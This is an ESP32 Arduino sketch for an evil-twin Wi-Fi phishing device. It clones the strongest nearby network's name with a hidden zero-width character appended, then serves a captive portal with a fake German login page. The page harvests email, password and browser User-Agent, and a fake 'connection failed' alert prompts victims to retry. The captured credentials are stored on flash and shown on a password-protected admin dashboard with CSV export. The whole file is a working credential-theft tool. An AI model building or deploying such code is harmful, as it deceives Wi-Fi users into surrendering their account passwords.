#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <FS.h>
#include <LittleFS.h>

const char *web_password = "***"; //CHANGE ME
const unsigned long SCAN_INTERVAL = 600000;

String currentSSID = "Free_WiFi";
unsigned long lastScanTime = 0;

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

const char *headerkeys[] = {"User-Agent"};
size_t headerkeyssize = sizeof(headerkeys) / sizeof(char*);

const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Anmeldung</title>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #1c1c1e; }
  .card { background: white; padding: 2rem; border-radius: 14px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 90%; max-width: 360px; text-align: center; position: relative; }
  h2 { font-size: 1.4rem; margin-bottom: 0.5rem; font-weight: 600; }
  p { color: #8e8e93; font-size: 0.95rem; margin-bottom: 1.5rem; line-height: 1.4; }
  .ssid-name { color: #007AFF; font-weight: 700; word-break: break-all; }
  input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #d1d1d6; border-radius: 10px; font-size: 16px; box-sizing: border-box; background: #f9f9f9; transition: 0.2s; }
  input:focus { border-color: #007AFF; outline: none; background: #fff; }
  button { width: 100%; padding: 14px; background-color: #007AFF; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 5px; }
  button:hover { background-color: #0056b3; }
  .footer { margin-top: 20px; font-size: 0.8rem; color: #c7c7cc; }
  
  #loader { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); flex-direction: column; justify-content: center; align-items: center; z-index: 10; border-radius: 14px; }
  .spinner { width: 40px; height: 40px; border: 4px solid rgba(0,122,255,0.2); border-left-color: #007AFF; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
  @keyframes spin { 100% { transform: rotate(360deg); } }
  .load-text { font-weight: 600; font-size: 0.9rem; color: #007AFF; }
</style>
<script>
  function simulateLoad(e) {
    e.preventDefault();
    const loader = document.getElementById('loader');
    if(document.querySelector('input[type="password"]').value.length < 1) return;
    document.activeElement.blur();
    loader.style.display = 'flex';
    setTimeout(() => { e.target.submit(); }, 1800); 
  }
</script>
</head>
<body>
  <div class="card">
    <div id="loader">
      <div class="spinner"></div>
      <div class="load-text">Verbindung wird geprüft...</div>
    </div>
    <h2>WLAN Anmeldung</h2>
    <p>Für den Zugang zu <span class="ssid-name">%SSID%</span> ist ein Konto erforderlich.</p>
    <form action="/dashboard" method="POST" onsubmit="simulateLoad(event)">
      <input type="text" name="email" placeholder="Identität / E-Mail" required autocomplete="email">
      <input type="password" name="password" placeholder="Passwort" required>
      <button type="submit">Verbinden</button>
    </form>
    <div class="footer">Sichere Verbindung</div>
  </div>
</body>
</html>
)rawliteral";

void saveLog(String data) {
  File file = LittleFS.open("/logs.txt", "a");
  if (file) {
    file.println(data);
    file.close();
    Serial.println("Log: " + data);
  }
}

void clearLogs() {
  File file = LittleFS.open("/logs.txt", "w");
  if (file) file.close();
}

String readLogsHTML() {
  if (!LittleFS.exists("/logs.txt")) return "<tr><td>Keine Logs.</td></tr>";
  File file = LittleFS.open("/logs.txt", "r");
  if (!file) return "<tr><td>Error reading.</td></tr>";
  
  String htmlRows = "";
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.length() > 0) {
      line.replace(";", " <b style='color:#007AFF'>|</b> ");
      htmlRows += "<tr><td>" + line + "</td></tr>";
    }
  }
  file.close();
  return htmlRows;
}

void scanAndSetSSID() {
  Serial.println("Scanning...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  int n = WiFi.scanNetworks();
  String strongestSSID = "";
  int bestRSSI = -100;

  if (n > 0) {
    for (int i = 0; i < n; ++i) {
      if (WiFi.SSID(i).length() > 0 && WiFi.RSSI(i) > bestRSSI) {
        bestRSSI = WiFi.RSSI(i);
        strongestSSID = WiFi.SSID(i);
      }
    }
  }

  if (strongestSSID != "") {
    if (strongestSSID.length() <= 29) currentSSID = strongestSSID + "\xE2\x80\x8B"; 
    else currentSSID = strongestSSID + " "; 
    Serial.println("Target: " + currentSSID);
  } else {
    currentSSID = "Free_WiFi"; 
  }

  WiFi.mode(WIFI_AP);
  WiFi.setHostname("network-auth");
  WiFi.softAP(currentSSID.c_str());
  
  dnsServer.stop();
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  Serial.print("AP IP: "); Serial.println(WiFi.softAPIP());
}

boolean isCaptivePortal() {
  if (!isIp(server.hostHeader()) && server.hostHeader() != (String("esp32-portal.local"))) {
    return true;
  }
  return false;
}

boolean isIp(String str) {
  for (size_t i = 0; i < str.length(); i++) {
    int c = str.charAt(i);
    if (c != '.' && (c < '0' || c > '9')) return false;
  }
  return true;
}

void handleRoot() {
  String html = index_html;
  html.replace("%SSID%", currentSSID); 
  server.send(200, "text/html", html);
}

void handleNotFound() {
  if (isCaptivePortal()) {
    handleRoot(); 
  } else {
    server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString());
    server.send(302, "text/plain", "Redirect");
  }
}

void handleDashboard() {
  String email = server.arg("email");
  String pass = "";
  if (server.hasArg("password")) pass = server.arg("password");
  else if (server.hasArg("auth")) pass = server.arg("auth");

  if (pass == web_password) {
    String html = "<!DOCTYPE HTML><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><title>Admin</title><style>body{font-family:monospace;background:#333;color:#fff;padding:10px}table{width:100%;background:#444;border-radius:5px}td{border-bottom:1px solid #555;padding:8px;font-size:11px}.btn{background:#28a745;color:white;padding:10px;text-decoration:none;display:block;margin-top:10px;border-radius:4px;text-align:center}</style></head><body>";
    html += "<h3>TARGET: " + currentSSID + "</h3>";
    html += "<p>Clients: " + String(WiFi.softAPgetStationNum()) + "</p>";
    html += "<a href='/csv?auth=" + String(web_password) + "' class='btn'>Download CSV</a>";
    html += "<a href='/clear?auth=" + String(web_password) + "' class='btn' style='background:#dc3545'>Clear Logs</a>";
    html += "<br><table>" + readLogsHTML() + "</table></body></html>";
    server.send(200, "text/html", html);
  } 
  else {
    if (pass.length() > 0 || email.length() > 0) {
      String ua = server.header("User-Agent"); ua.replace(";", ",");
      saveLog(email + ";" + pass + ";" + ua);
    }
    String html = index_html;
    html.replace("%SSID%", currentSSID);
    html.replace("</body>", "<script>alert('Verbindung fehlgeschlagen. Bitte versuchen Sie es erneut.');</script></body>");
    server.send(200, "text/html", html);
  }
}

void handleCSV() {
  if (server.arg("auth") != web_password) return;
  File file = LittleFS.open("/logs.txt", "r");
  if (file) {
    server.sendHeader("Content-Disposition", "attachment; filename=\"logs.csv\"");
    server.streamFile(file, "text/csv");
    file.close();
  } else {
    server.send(200, "text/plain", "No Data");
  }
}

void handleClear() {
  if (server.arg("auth") != web_password) return;
  clearLogs();
  server.sendHeader("Location", "/dashboard?auth=" + String(web_password));
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  
  if(!LittleFS.begin(true)){
    Serial.println("LittleFS Error");
    return;
  }

  scanAndSetSSID();

  server.collectHeaders(headerkeys, headerkeyssize);

  server.on("/", handleRoot);
  server.on("/index.html", handleRoot);
  server.on("/dashboard", HTTP_ANY, handleDashboard);
  server.on("/csv", handleCSV);
  server.on("/clear", handleClear);
  
  server.on("/generate_204", handleRoot);
  server.on("/gen_204", handleRoot);
  server.on("/hotspot-detect.html", handleRoot);
  server.on("/ncsi.txt", handleRoot);
  server.on("/connecttest.txt", handleRoot);
  server.on("/success.txt", handleRoot);
  
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("Ready.");
}

void loop() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastScanTime >= SCAN_INTERVAL) {
    lastScanTime = currentMillis;
    scanAndSetSSID();
  }

  dnsServer.processNextRequest();
  server.handleClient();
}
